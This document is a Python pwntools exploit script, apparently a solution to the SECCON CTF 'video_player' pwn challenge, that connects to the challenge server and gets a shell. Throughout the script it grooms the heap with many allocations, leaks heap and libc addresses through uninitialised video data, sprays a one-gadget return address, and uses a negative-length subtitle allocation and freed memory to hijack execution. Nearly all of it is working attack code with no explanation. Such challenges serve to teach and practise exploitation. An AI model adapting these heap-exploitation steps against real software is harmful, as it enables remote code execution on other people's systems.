from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'video_player.pwn.seccon.jp', 7777
r = remote(HOST, PORT)

def addVideo(frames, data, desc):
    r.recvuntil('>>>')
    r.sendline('1')
    r.recvuntil('>>>')
    r.sendline('1')
    r.recvuntil(':')
    r.send(p64(0))
    r.recvuntil(':')
    r.send(p32(0))
    r.recvuntil(':')
    r.send(p32(frames))
    r.recvuntil(':')
    r.send(data)
    r.recvuntil(':')
    r.send(desc)

def addSub(length, data, lang=False):
    r.recvuntil('>>>')
    r.sendline('1')
    r.recvuntil('>>>')
    r.sendline('3')
    if lang:
        r.recvuntil(':')
        r.send('KO')
    r.recvuntil(':')
    r.send(p32(length & 0xFFFFFFFF))
    r.recvuntil(':')
    r.send(data)

def delVid(idx):
    r.recvuntil('>>>')
    r.sendline('4')
    r.recvuntil(':')
    r.sendline(str(idx))

def playVid(idx, size):
    r.recvuntil('>>>')
    r.sendline('3')
    r.recvuntil(':')
    r.sendline(str(idx))
    r.recvuntil('...\n')
    return xor(r.recvn(size), '\xcc')

r.recvuntil('?')
r.send('\x00' * 0xf0)

for i in range(0x10):
	print i,
	addVideo(0x300 - 8,'PAD', 'PAD')
print 

for i in range(0x20):
    print i,
    addVideo(0x200 - 8,'PAD', 'PAD')
print

for i in range(0x20):
    print i,
    addVideo(0x100 - 8,'PAD', 'PAD')
print

for i in range(0x20):
	print i,
	addVideo(0x78, 'PAD', 'PAD')
print

for i in range(0x10):
    print i,
    addVideo(0x20 - 8,'PAD', 'PAD')
    addVideo(0x30 - 8,'PAD', 'PAD')
    addVideo(0x40 - 8,'PAD', 'PAD')
    addVideo(0x50 - 8,'PAD', 'PAD')
print

clipCount = 0x10 + 0x20 + 0x20 + 0x20 + 0x10 * 4


print clipCount

addVideo(0x68, 'AAAA', 'BBBB')
addVideo(0x68, 'AAAA', 'BBBB')  
addVideo(0x68, 'AAAA', 'BBBB')

heapLeak = '\0'

for i in range(7):
    delVid(clipCount + i * 3)
    delVid(clipCount + 1 + i * 3)

    addVideo(0x68, 'C' * (i+1), 'B')

    heapLeak += playVid(clipCount + 3 + i * 3, i + 2)[i+1:]

    addVideo(0x68, 'PAD', 'PAD')
    addVideo(0x68, 'PAD', 'PAD')

heapLeak = u64(heapLeak)
print hex(heapLeak)

clipCount += 3 + 3 * 7

libcLeak = ''

addVideo(0xf8, 'AAA', 'AAA')
addVideo(0xf8, 'BBB', 'BBB')
addVideo(0xf8, 'CCC', 'CCC')
addVideo(0xf8, 'DDD', 'DDD')

for i in range(8):
    delVid(clipCount + i * 4)
    delVid(clipCount + 2 + i * 4)


    addVideo(0xf8, 'C' * (8 + i), 'B')

    libcLeak += playVid(clipCount + i * 4 + 4, 8 + i + 1)[8 + i:]

    addVideo(0xf8, 'C', 'C')
    addVideo(0xf8, 'C', 'C')
    addVideo(0xf8, 'C', 'C')

libcBase = u64(libcLeak) - 0x3c4c68

print hex(libcBase)

for i in range(8):
	addVideo(0x38, 'PAD', 'PAD')

clipCount += 4 + 4 * 8 + 8

addVideo(0x40, 'HOLE', 'HOLE')

rip = libcBase + 0xf0274
#rip = 0xdeadbeef
for i in range(0x40):
	print i,
	addVideo(0x400, p64(rip) * 0x7F, 'SPRAY')

addSub(0x80, 'B' * 0x50 + p64(heapLeak + 0x14140), lang=True)
delVid(clipCount)
addSub(-0x40, 'C')

pause()

delVid(clipCount + 1)

r.interactive()
